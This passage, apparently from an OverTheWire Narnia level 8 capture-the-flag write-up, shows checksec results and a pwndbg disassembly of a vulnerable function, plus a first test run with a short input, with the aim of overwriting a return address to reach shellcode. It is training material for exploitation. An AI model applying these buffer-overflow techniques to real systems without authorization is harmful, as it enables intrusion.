id="t.440976c10600b68d60560e63eb178cdbd1a8d2f6"></a><a id="t.84"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c11">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/narnia/8]</span><span class="c3"><br></span><span class="c11">&#9492;&#9472;&#9472;&#9596;</span><span class="c3">&nbsp;</span><span class="c11">$checksec</span><span class="c3">&nbsp;</span><span class="c11">narnia8</span><span class="c3"><br></span><span class="c11">[*]</span><span class="c3">&nbsp;</span><span class="c11">&#39;/home/0xd4y/business/other/overthewire/narnia/8/narnia8&#39;</span><span class="c3"><br> &nbsp; &nbsp;Arch: &nbsp; &nbsp; </span><span class="c11">i386-32-little</span><span class="c3"><br> &nbsp; &nbsp;RELRO: &nbsp; &nbsp;</span><span class="c8">No</span><span class="c3">&nbsp;</span><span class="c11">RELRO</span><span class="c3"><br> &nbsp; &nbsp;Stack: &nbsp; &nbsp;</span><span class="c8">No</span><span class="c3">&nbsp;</span><span class="c11">canary</span><span class="c3">&nbsp;</span><span class="c11">found</span><span class="c3"><br> &nbsp; &nbsp;NX: &nbsp; &nbsp; &nbsp; </span><span class="c11">NX</span><span class="c3">&nbsp;</span><span class="c11">disabled</span><span class="c3"><br> &nbsp; &nbsp;PIE: &nbsp; &nbsp; &nbsp;</span><span class="c8">No</span><span class="c3">&nbsp;</span><span class="c11">PIE</span><span class="c3">&nbsp;</span><span class="c11">(0x8048000)</span><span class="c3"><br> &nbsp; &nbsp;RWX: &nbsp; &nbsp; &nbsp;</span><span class="c11">Has</span><span class="c3">&nbsp;</span><span class="c11">RWX</span><span class="c3">&nbsp;</span><span class="c11">segments</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Therefore, the return address of func could potentially be overwritten to point to shellcode.</span></p><h3 class="c10" id="h.ihr6gj74lno1"><span class="c5">Buffer Overflow</span></h3><p class="c0"><span class="c2">Passing a large input into the argument of the program did not result in a segmentation fault. </span></p><h4 class="c21" id="h.closiciqkdn5"><span class="c16">Gdb</span></h4><p class="c0"><span class="c2">The program can be analyzed in a dynamic environment using gdb. This will help in further understanding how the binary works. Before providing an input, we must first put a break point toward the end of func right before the program exits:</span></p><a id="t.6f022a5c36daa809648c9db99d333e02a347384f"></a><a id="t.85"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; disass func &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Dump of assembler code for function func: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x0804841b</span><span class="c3">&nbsp;&lt;+</span><span class="c8">0</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">ebp</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x0804841c</span><span class="c3">&nbsp;&lt;+</span><span class="c8">1</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">ebp</span><span class="c3">,</span><span class="c8">esp</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x0804841e</span><span class="c3">&nbsp;&lt;+</span><span class="c8">3</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">sub</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">esp</span><span class="c3">,</span><span class="c8">0x18</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x08048421</span><span class="c3">&nbsp;&lt;+</span><span class="c8">6</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">ebp</span><span class="c3">+</span><span class="c8">0x8</span><span class="c3">] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048424</span><span class="c3">&nbsp;&lt;+</span><span class="c8">9</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">ebp</span><span class="c3">-</span><span class="c8">0x4</span><span class="c3">],</span><span class="c8">eax</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048427</span><span class="c3">&nbsp;&lt;+</span><span class="c8">12</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x14</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048429</span><span class="c3">&nbsp;&lt;+</span><span class="c8">14</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x0804842b</span><span class="c3">&nbsp;&lt;+</span><span class="c8">16</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">lea</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,[</span><span class="c8">ebp</span><span class="c3">-</span><span class="c8">0x18</span><span class="c3">] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x0804842e</span><span class="c3">&nbsp;&lt;+</span><span class="c8">19</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">eax</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x0804842f</span><span class="c3">&nbsp;&lt;+</span><span class="c8">20</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">call</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x8048300</span><span class="c3">&nbsp;&lt;memset@plt&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048434</span><span class="c3">&nbsp;&lt;+</span><span class="c8">25</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">esp</span><span class="c3">,</span><span class="c8">0xc</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x08048437</span><span class="c3">&nbsp;&lt;+</span><span class="c8">28</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;</span><span class="c8">ds</span><span class="c3">:</span><span class="c8">0x80497b0</span><span class="c3">,</span><span class="c8">0x0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048441</span><span class="c3">&nbsp;&lt;+</span><span class="c8">38</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">jmp</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">0x8048469</span><span class="c3">&nbsp;&lt;func+</span><span class="c8">78</span><span class="c3">&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048443</span><span class="c3">&nbsp;&lt;+</span><span class="c8">40</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">ds</span><span class="c3">:</span><span class="c8">0x80497b0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048448</span><span class="c3">&nbsp;&lt;+</span><span class="c8">45</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">edx</span><span class="c3">,</span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;</span><span class="c8">ds</span><span class="c3">:</span><span class="c8">0x80497b0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x0804844e</span><span class="c3">&nbsp;&lt;+</span><span class="c8">51</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">ecx</span><span class="c3">,</span><span class="c8">edx</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048450</span><span class="c3">&nbsp;&lt;+</span><span class="c8">53</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">edx</span><span class="c3">,</span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">ebp</span><span class="c3">-</span><span class="c8">0x4</span><span class="c3">] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x08048453</span><span class="c3">&nbsp;&lt;+</span><span class="c8">56</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">edx</span><span class="c3">,</span><span class="c8">ecx</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x08048455</span><span class="c3">&nbsp;&lt;+</span><span class="c8">58</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">movzx</span><span class="c3">&nbsp; </span><span class="c8">edx</span><span class="c3">,</span><span class="c8">BYTE</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">edx</span><span class="c3">] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x08048458</span><span class="c3">&nbsp;&lt;+</span><span class="c8">61</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">BYTE</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">ebp</span><span class="c3">+</span><span class="c8">eax</span><span class="c3">*</span><span class="c8">1</span><span class="c3">-</span><span class="c8">0x18</span><span class="c3">],</span><span class="c8">dl</span><span class="c3"><br> &nbsp; </span><span class="c8">0x0804845c</span><span class="c3">&nbsp;&lt;+</span><span class="c8">65</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">ds</span><span class="c3">:</span><span class="c8">0x80497b0</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048461</span><span class="c3">&nbsp;&lt;+</span><span class="c8">70</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">0x1</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048464</span><span class="c3">&nbsp;&lt;+</span><span class="c8">73</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">ds</span><span class="c3">:</span><span class="c8">0x80497b0</span><span class="c3">,</span><span class="c8">eax</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048469</span><span class="c3">&nbsp;&lt;+</span><span class="c8">78</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">ds</span><span class="c3">:</span><span class="c8">0x80497b0</span><span class="c3">&nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x0804846e</span><span class="c3">&nbsp;&lt;+</span><span class="c8">83</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">edx</span><span class="c3">,</span><span class="c8">eax</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048470</span><span class="c3">&nbsp;&lt;+</span><span class="c8">85</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">ebp</span><span class="c3">-</span><span class="c8">0x4</span><span class="c3">]<br> &nbsp; </span><span class="c8">0x08048473</span><span class="c3">&nbsp;&lt;+</span><span class="c8">88</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">edx</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048475</span><span class="c3">&nbsp;&lt;+</span><span class="c8">90</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">movzx</span><span class="c3">&nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">BYTE</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">eax</span><span class="c3">]<br> &nbsp; </span><span class="c8">0x08048478</span><span class="c3">&nbsp;&lt;+</span><span class="c8">93</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">test</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">al</span><span class="c3">,</span><span class="c8">al</span><span class="c3"><br> &nbsp; </span><span class="c8">0x0804847a</span><span class="c3">&nbsp;&lt;+</span><span class="c8">95</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">jne</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">0x8048443</span><span class="c3">&nbsp;&lt;func+</span><span class="c8">40</span><span class="c3">&gt;<br> &nbsp; </span><span class="c8">0x0804847c</span><span class="c3">&nbsp;&lt;+</span><span class="c8">97</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">lea</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,[</span><span class="c8">ebp</span><span class="c3">-</span><span class="c8">0x18</span><span class="c3">]<br> &nbsp; </span><span class="c8">0x0804847f</span><span class="c3">&nbsp;&lt;+</span><span class="c8">100</span><span class="c3">&gt;: &nbsp; </span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">eax</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048480</span><span class="c3">&nbsp;&lt;+</span><span class="c8">101</span><span class="c3">&gt;: &nbsp; </span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x8048550</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048485</span><span class="c3">&nbsp;&lt;+</span><span class="c8">106</span><span class="c3">&gt;: &nbsp; </span><span class="c6">call</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x80482e0</span><span class="c3">&nbsp;&lt;printf@plt&gt;<br> &nbsp; </span><span class="c8">0x0804848a</span><span class="c3">&nbsp;&lt;+</span><span class="c8">111</span><span class="c3">&gt;: &nbsp; </span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">esp</span><span class="c3">,</span><span class="c8">0x8</span><span class="c3"><br> &nbsp; </span><span class="c8">0x0804848d</span><span class="c3">&nbsp;&lt;+</span><span class="c8">114</span><span class="c3">&gt;: &nbsp; </span><span class="c6">nop</span><span class="c3"><br> &nbsp; </span><span class="c8">0x0804848e</span><span class="c3">&nbsp;&lt;+</span><span class="c8">115</span><span class="c3">&gt;: &nbsp; </span><span class="c6">leave</span><span class="c3">&nbsp; <br> &nbsp; </span><span class="c8">0x0804848f</span><span class="c3">&nbsp;&lt;+</span><span class="c8">116</span><span class="c3">&gt;: &nbsp; </span><span class="c6">ret</span><span class="c3">&nbsp; &nbsp; </span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">A breakpoint was then set at the nop operation, and an input of 5 A&rsquo;s was passed (this amount was chosen arbitrarily):</span></p><a id="t.244eec9086db5305ed94765f6c68aff8d9f3dcc7"></a><a id="t.86"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; b *</span><span class="c8">0</span><span class="c3">x0804848d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Breakpoint </span><span class="c8">1</span><span class="c3">&nbsp;at </span><span class="c8">0</span><span class="c3">x804848d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>pwndbg&gt; r $(python -c </span><span class="c11">&quot;print &#39;A&#39;*5&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: </span><span class="c12">/home/</span><span class="c8">0</span><span class="c3">xd4y</span><span class="c12">/business/</span><span class="c3">other</span><span class="c12">/overthewire/</span><span class="c3">narnia</span><span class="c12">/8/</span><span class="c3">narnia8 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*5&quot;</span><span class="c3">) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>AAAAA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 